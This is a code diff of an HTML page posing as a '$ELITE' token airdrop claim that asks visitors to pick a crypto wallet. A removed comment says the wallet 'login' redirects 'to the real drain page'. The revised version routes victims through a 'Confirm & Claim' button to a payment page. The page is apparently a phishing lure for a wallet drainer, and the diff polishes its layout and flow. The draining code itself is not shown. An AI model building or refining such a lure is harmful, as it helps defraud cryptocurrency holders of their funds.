@@ -7,9 +7,35 @@
         body { font-family: Arial, sans-serif; text-align: center; background: #0a0a1f; color: #00ff9d; padding: 40px 20px; margin: 0; }
         h1 { color: white; font-size: 28px; margin-bottom: 10px; }
         p { font-size: 18px; max-width: 600px; margin: 20px auto; }
-        button { padding: 18px 50px; font-size: 22px; background: #00ff9d; color: black; border: none; border-radius: 12px; cursor: pointer; margin-top: 30px; font-weight: bold; }
-        .wallet-options { display: flex; flex-direction: column; gap: 15px; max-width: 320px; margin: 30px auto; }
-        .option { background: #1a1a2e; padding: 15px; border-radius: 10px; display: flex; align-items: center; gap: 15px; cursor: pointer; }
+        button { 
+            padding: 18px 50px; 
+            font-size: 22px; 
+            background: #00ff9d; 
+            color: black; 
+            border: none; 
+            border-radius: 12px; 
+            cursor: pointer; 
+            margin-top: 30px; 
+            font-weight: bold; 
+            width: 100%;
+            max-width: 320px;
+        }
+        .wallet-options { 
+            display: flex; 
+            flex-direction: column; 
+            gap: 15px; 
+            max-width: 320px; 
+            margin: 30px auto; 
+        }
+        .option { 
+            background: #1a1a2e; 
+            padding: 15px; 
+            border-radius: 10px; 
+            display: flex; 
+            align-items: center; 
+            gap: 15px; 
+            cursor: pointer;
+        }
     </style>
 </head>
 <body>
@@ -17,24 +43,22 @@
     <p>Connect your wallet to claim your $ELITE airdrop allocation.</p>
 
     <div class="wallet-options">
-        <div class="option" onclick="connectWallet()">
-            <strong>MetaMask</strong>
-        </div>
-        <div class="option" onclick="connectWallet()">
-            <strong>WalletConnect</strong>
-        </div>
-        <div class="option" onclick="connectWallet()">
-            <strong>Trust Wallet</strong>
-        </div>
-        <div class="option" onclick="connectWallet()">
-            <strong>Coinbase Wallet</strong>
-        </div>
+        <div class="option" onclick="selectPayment(this)">MetaMask</div>
+        <div class="option" onclick="selectPayment(this)">WalletConnect</div>
+        <div class="option" onclick="selectPayment(this)">Trust Wallet</div>
+        <div class="option" onclick="selectPayment(this)">Coinbase Wallet</div>
     </div>
 
+    <button onclick="goToPaymentPage()">Confirm & Claim</button>
+
     <script>
-        function connectWallet() {
-            // After "login", redirect to the real drain page
-            window.location.href = "claim.html";
+        function selectPayment(el) {
+            el.style.background = "#00ff9d";
+            el.style.color = "black";
+        }
+
+        function goToPaymentPage() {
+            window.location.href = "payment.html";
         }
     </script>
 </body>
